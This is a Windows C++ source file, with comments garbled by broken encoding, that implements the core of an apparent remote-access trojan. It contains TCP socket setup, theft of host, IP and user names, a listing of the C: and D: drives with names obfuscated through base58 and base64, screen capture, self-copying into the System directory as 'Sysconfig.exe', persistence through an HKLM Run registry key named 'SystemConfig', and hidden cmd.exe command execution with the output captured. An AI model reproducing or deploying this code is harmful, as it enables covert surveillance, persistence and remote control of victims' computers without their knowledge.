#include "tcpSocke.h"

bool init_Socket()
{
	WSADATA data;
	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)//Windows socket async ��Windows�첽�׽���
	{
		err("WSAStartup");
		return false;
	}
	return true;
}

bool close_Socket()
{
	if (WSACleanup() != 0)
	{
		err("WSACleanup");
		return false;
	}
	return true;
}

SOCKET CreatServerScoket()
{
	//1�������յ�socket
	/*
	parm1��AF ��ַЭ���� IPv4�� IPv6
	parm2��type ��ַЭ������ ��ʽ�׽��֣� ���ݱ�
	parm3��protocol ʹ�þ����ĳ������Э��
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2����ip��ַ�Ͷ˿ں�
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//�ʹ���ʱҪһ��
	addr.sin_port = htons(PORT);	//�������ֽ�˳��ת��Ϊ�����ֽ�˳��
	addr.sin_addr.S_un.S_addr = ADDR_ANY;//inet_addr("127.0.0.1")

	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		err("bind");
		return false;
	}
	//3�������绰��
	listen(fd, 10);
	return fd;
}

SOCKET CreatClientScoket(const char* ip)
{
	//1�������յ�socket
	/*
	parm1��AF ��ַЭ���� IPv4�� IPv6
	parm2��type ��ַЭ������ ��ʽ�׽��֣� ���ݱ�
	parm3��protocol ʹ�þ����ĳ������Э��
	*/
	SOCKET fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == INVALID_SOCKET)
	{
		err("SOCKET");
	}
	//2����ip��ַ�Ͷ˿ں�
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;//�ʹ���ʱҪһ��
	addr.sin_port = htons(PORT);	//�������ֽ�˳��ת��Ϊ�����ֽ�˳��
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	//3�����������������
	if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == INVALID_SOCKET)
	{
		err("connect");
		return false;
	}
	return fd;
}

bool getmessage(struct PC_Message* messages)
{
	DWORD NameLen = BUFSIZ;
	if (gethostname(messages->PCName, sizeof(messages->PCName)) == SOCKET_ERROR)
	{
		err("PCName");
	}
	struct hostent* p = gethostbyname(messages->PCName);
	if (p == 0)
	{
		err("host and IP");
	}
	else
	{
		//��ȡ�����������
		for (int i = 0; p->h_addr_list[i] != 0; i++)//����IP
		{
			struct in_addr in;
			memcpy(&in, p->h_addr_list[i], sizeof(struct in_addr));
			strcpy(messages->IP, inet_ntoa(in));
		}
	}
	if (!GetUserName(messages->UserName, &NameLen))
	{
		err("UserName");
	}
	return true;
}

bool TcharToChar(const TCHAR* tchar, char* _char)
{
	int iLength;
	//��ȡ�ֽڳ���   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//��tcharֵ����_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
	return true;
}

bool HeartBeat(SOCKET fd)
{
	char buf[] = "keep alive";
	encode(buf);
	while (true)
	{
		//send(fd, buf, sizeof(buf), 0);
		cout << buf << endl;
		Sleep(5000);
	}
	return false;
}

void base58encode(char plainText[])
{
	int i;
	long long sum = 0;
	int len = strlen(plainText) * 138 / 100 + 1;// len * log(2)256 / log(2)(58) + 1
	char base58Table[59] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	char* encryption = (char*)malloc(len * sizeof(char));
	int index = 0;
	memset(encryption, 0, len * sizeof(char));
	while (index < strlen(plainText)) {
		int each = plainText[index];
		for (i = len - 1; ; i--) {
			each += encryption[i] * 256;
			encryption[i] = each % 58;
			each /= 58;
			if (0 == each)
				break;
		}
		i = 0;//���
		index++;
	}
	i = 0;
	while (!encryption[i])
		i++;
	for (; i <= len - 1; i++)
	{
		plainText[i] = base58Table[encryption[i]];
	}
}

bool base58decode(unsigned char* src)  // ����
{
	static char b58n[] =
	{
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1,  0,  1,  2,  3,  4,  5,  6,  7,  8, -1, -1, -1, -1, -1, -1,
		-1,  9, 10, 11, 12, 13, 14, 15, 16, -1, 17, 18, 19, 20, 21, -1,
		22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, -1, -1, -1, -1, -1,
		-1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, -1, 44, 45, 46,
		47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
		-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
	};
	size_t len = strlen((char*)src);
	size_t rlen = (len / 4 + 1) * 3;
	unsigned char* ret = (unsigned char*)malloc(rlen);
	unsigned char* rptr = ret + rlen;
	size_t i;
	unsigned char* ptr;
	for (i = 0; i < len; i++)
	{
		char rest = b58n[src[i]];
		if (rest < 0)
		{
			free(ret);
			return NULL;
		}
		for (ptr = ret + rlen - 1; ptr >= rptr; ptr--)
		{
			unsigned int c = rest + *ptr * 58;
			*ptr = c % 256;
			rest = c / 256;
		}
		if (rest > 0)
		{
			rptr--;
			if (rptr < ret)
			{
				free(ret);
				return NULL;
			}
			*rptr = rest;
		}
	}
	for (i = 0; i < ret + rlen - rptr; i++)
		ret[i] = rptr[i];
	ret[i] = 0;
	memcpy(src, ret, strlen((char*)src));
	return true;
}

void base64encode(char* str)
{
	long len;
	long str_len;
	char* res;
	int i, j;
	//����base64�����  
	char* base64_table = (char*)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	//���㾭��base64�������ַ�������  
	str_len = strlen(str);
	if (str_len % 3 == 0)
		len = str_len / 3 * 4;
	else
		len = (str_len / 3 + 1) * 4;

	res = (char*)malloc(sizeof(unsigned char) * len + 1);
	res[len] = '\0';

	//��3��8λ�ַ�Ϊһ����б���  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[i] = base64_table[str[j] >> 2]; //ȡ����һ���ַ���ǰ6λ���ҳ���Ӧ�Ľ���ַ�  
		res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)]; //����һ���ַ��ĺ�λ��ڶ����ַ���ǰ4λ������ϲ��ҵ���Ӧ�Ľ���ַ�  
		res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)]; //���ڶ����ַ��ĺ�4λ��������ַ���ǰ2λ��ϲ��ҳ���Ӧ�Ľ���ַ�  
		res[i + 3] = base64_table[str[j + 2] & 0x3f]; //ȡ���������ַ��ĺ�6λ���ҳ�����ַ�  
	}

	switch (str_len % 3)
	{
	case 1:
		res[i - 2] = '=';
		res[i - 1] = '=';
		break;
	case 2:
		res[i - 1] = '=';
		break;
	}
	strcpy(str, res);
}

void base64decode(char* str)
{
	int table[] = { 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,0,0,0,0,0,
			 0,0,0,0,0,0,0,62,0,0,0,
			 63,52,53,54,55,56,57,58,
			 59,60,61,0,0,0,0,0,0,0,0,
			 1,2,3,4,5,6,7,8,9,10,11,12,
			 13,14,15,16,17,18,19,20,21,
			 22,23,24,25,0,0,0,0,0,0,26,
			 27,28,29,30,31,32,33,34,35,
			 36,37,38,39,40,41,42,43,44,
			 45,46,47,48,49,50,51
	};
	long len;
	long str_len;
	char* res;
	int i, j;

	//����������ַ�������  
	len = strlen(str);
	//�жϱ������ַ������Ƿ���=  
	if (strstr(str, "=="))
		str_len = len / 4 * 3 - 2;
	else if (strstr(str, "="))
		str_len = len / 4 * 3 - 1;
	else
		str_len = len / 4 * 3;

	res = (char*)malloc(sizeof(char) * str_len + 1);
	res[str_len] = '\0';

	//��4���ַ�Ϊһλ���н���  
	for (i = 0, j = 0; i < len - 2; j += 3, i += 4)
	{
		res[j] = ((char)table[str[i]]) << 2 | (((char)table[str[i + 1]]) >> 4); //ȡ����һ���ַ���Ӧbase64���ʮ��������ǰ6λ��ڶ����ַ���Ӧbase64���ʮ�������ĺ�2λ�������  
		res[j + 1] = (((char)table[str[i + 1]]) << 4) | (((char)table[str[i + 2]]) >> 2); //ȡ���ڶ����ַ���Ӧbase64���ʮ�������ĺ�4λ��������ַ���Ӧbas464���ʮ�������ĺ�4λ�������  
		res[j + 2] = (((char)table[str[i + 2]]) << 6) | ((char)table[str[i + 3]]); //ȡ���������ַ���Ӧbase64���ʮ�������ĺ�2λ���4���ַ��������  
	}

	strcpy(str, res);

}

void encode(char* text)
{
	base58encode(text);
	base64encode(text);
}

void decode(char* pwd)
{
	base58decode((unsigned char*)pwd);
	base64decode(pwd);
}

void ScreenShot(LPCTSTR s)
{
	HDC hdcSrc = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);//����
	int nWidth = GetDeviceCaps(hdcSrc, HORZRES);//��
	int nHeight = GetDeviceCaps(hdcSrc, VERTRES);//��
	CImage image;
	image.Create(nWidth, nHeight, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
															//SRCCOPY ֱ�Ӹ���Դ�豸����Ŀ���豸��
	ReleaseDC(NULL, hdcSrc);
	image.ReleaseDC();
	image.Save(s, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
}

//void readSrc(SOCKET fd)
//{
//	// 1. ��ͼƬ�ļ�
//	ifstream Src("C:\\Windows\\Screenshots.bmp", ifstream::in | ios::binary);
//	// 2. ����ͼƬ����
//	Src.seekg(0, Src.end);  //���ļ���ָ�붨λ������ĩβ
//	int length = Src.tellg();
//	Src.seekg(0, Src.beg);  //���ļ���ָ�����¶�λ�����Ŀ�ʼ
//	// 3. �����ڴ滺����
//	char* buffer = new char[length];
//	// 4. ��ȡͼƬ
//	Src.read(buffer, length);
//	// ���ˣ�ͼƬ�Ѿ��ɹ��ı���ȡ���ڴ棨buffer����
//	cout << buffer << endl;
//	//send(fd, buffer, strlen(buffer), 0);
//	delete[] buffer;
//}

void GetFileName(char FileName[FileNameRow][FileNameCol])
{
	int i;
	for (i = 0; i < FileNameRow; i++)//�Դ洢�ļ����Ķ�ά�����ʼ��
	{
		memset(FileName[i], 0, sizeof(FileName[i]));
	}
	intptr_t Handle;
	struct _finddata_t FileInfo;
	string p;
	string path1 = "C:";
	string path2 = "D:";
	Handle = _findfirst(p.assign(path1).append("\\*").c_str(), &FileInfo);
	strcpy(FileName[0], "C drive");//��ʾ
	i = 1;
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	strcpy(FileName[i++], "D drive");//��ʾ
	Handle = _findfirst(p.assign(path2).append("\\*").c_str(), &FileInfo);
	while (_findnext(Handle, &FileInfo) == 0)
	{
		strcpy(FileName[i], FileInfo.name);
		i++;
	}
	_findclose(Handle);
	//����
	char Zero[FileNameCol] = { 0 };
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			encode(FileName[i]);
		}
	}
}

int ComputerStart(char* pathName)
{
	HKEY hKey;
	DWORD result;

	//��ע���
	result = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Ҫ�򿪵�ע���������
		0,              // �������������� 0
		KEY_SET_VALUE,  // ��Ȩ�ޣ�д��
		&hKey           // ��֮��ľ��
	);

	if (result != ERROR_SUCCESS)
	{
		return 0;
	}
	// ��ע���������(û���������һ��ֵ)
	result = RegSetValueEx(
		hKey,
		(LPCWSTR)(CString)"SystemConfig", // ����
		0,                  // �������������� 0
		REG_SZ,             // ��ֵ����Ϊ�ַ���
		(const unsigned char*)pathName, // �ַ����׵�ַ
		strlen(pathName)        // �ַ�������
	);

	if (result != ERROR_SUCCESS) 
	{
		return 0;
	}
	//�ر�ע���:
	RegCloseKey(hKey);
}

int copySelf(char* path)
{
	char fileName[MAX_PATH];
	char sysPath[MAX_PATH];
	//��ø��ļ�������·��
	GetModuleFileName(NULL, (LPWSTR)fileName, sizeof(fileName));
	//ȡ��SystemĿ¼������·������д��sysPath
	GetSystemDirectory((LPWSTR)sysPath, sizeof(sysPath));
	sprintf(path, "%s\\Sysconfig.exe", sysPath);
	//���ļ����Ƶ�ϵͳĿ¼
	CopyFile((LPWSTR)fileName, (LPWSTR)path, TRUE);
	return 0;
}

int CaptureImage(HWND hwnd, CHAR* dirPath, CHAR* filename)
{
	HANDLE hDIB;
	HANDLE hFile;
	DWORD dwBmpSize;
	DWORD dwSizeofDIB;
	DWORD dwBytesWritten;
	CHAR FilePath[MAX_PATH];
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	CHAR* lpbitmap;
	INT width = GetSystemMetrics(SM_CXSCREEN);  // ��Ļ��
	INT height = GetSystemMetrics(SM_CYSCREEN);  // ��Ļ��
	HDC hdcScreen = GetDC(NULL); // ȫ��ĻDC
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // ���������ڴ�DC

	if (!hdcMemDC) goto done;

	// ͨ������DC ����һ������λͼ
	hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);

	if (!hbmScreen) goto done;

	// ��λͼ�鴫�͵������ڴ�DC��
	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,    // Ŀ��DC
		0, 0,        // Ŀ��DC�� x,y ����
		width, height, // Ŀ�� DC �Ŀ��
		hdcScreen,   // ��ԴDC
		0, 0,        // ��ԴDC�� x,y ����
		SRCCOPY))    // ճ����ʽ
		goto done;

	// ��ȡλͼ��Ϣ������� bmpScreen ��
	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	// handle ָ�����Ĭ�ϵĶ�
	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char*)GlobalLock(hDIB);

	// ��ȡ����λͼ��λ���ҿ��������һ�� lpbitmap ��.
	GetDIBits(
		hdcScreen,  // �豸�������
		hbmScreen,  // λͼ���
		0,          // ָ�������ĵ�һ��ɨ����
		(UINT)bmpScreen.bmHeight, // ָ��������ɨ������
		lpbitmap,   // ָ����������λͼ���ݵĻ�������ָ��
		(BITMAPINFO*)&bi, // �ýṹ�屣��λͼ�����ݸ�ʽ
		DIB_RGB_COLORS // ��ɫ���ɺ졢�̡�����RGB������ֱ��ֵ����
	);


	wsprintf((LPWSTR)FilePath, (LPWSTR)"%s\\%s.bmp", dirPath, filename);

	// ����һ���ļ��������ļ���ͼ
	hFile = CreateFile(
		(LPWSTR)FilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	// �� ͼƬͷ(headers)�Ĵ�С, ����λͼ�Ĵ�С����������ļ��Ĵ�С
	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	// ���� Offset ƫ����λͼ��λ(bitmap bits)ʵ�ʿ�ʼ�ĵط�
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

	// �ļ���С
	bmfHeader.bfSize = dwSizeofDIB;

	// λͼ�� bfType �������ַ��� "BM"
	bmfHeader.bfType = 0x4D42; //BM

	dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	// �������ڴ沢�ͷ�
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	// �ر��ļ����
	CloseHandle(hFile);

	// ������Դ
done:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	Sleep(200);
	//bmptojpg24x("screen.bmp", "screen.jpg", 50);

	return 0;
}

int cmd(char* cmdStr, char* message)
{
	DWORD readByte = 0;
	char command[BUFSIZ * 2] = { 0 };
	char buf[BUFSIZ * 2] = { 0 }; //������

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // ����������Ϣ
	PROCESS_INFORMATION pi; // ������Ϣ
	SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����

	// ���ùܵ���ȫ����
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	// ���������ܵ����ܵ�����ǿɱ��̳е�
	if (!CreatePipe(&hRead, &hWrite, &sa, BUFSIZ * 2)) {
		return 1;
	}

	// ���� cmd ������Ϣ
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si); // ��ȡ���ݴ�С
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
	si.wShowWindow = SW_HIDE;               // ���ش�������
	si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ

	// ƴ�� cmd ����
	sprintf(command, "cmd.exe /c %s", cmdStr);

	// �����ӽ���,��������,�ӽ����ǿɼ̳е�
	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(hRead);
		CloseHandle(hWrite);
		printf("error!");
		return 1;
	}
	CloseHandle(hWrite);

	//��ȡ�ܵ���read��,���cmd���
	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL)) 
	{
		strcat(message, buf);
		ZeroMemory(buf, BUFSIZ * 2);
	}
	CloseHandle(hRead);

	return 0;
}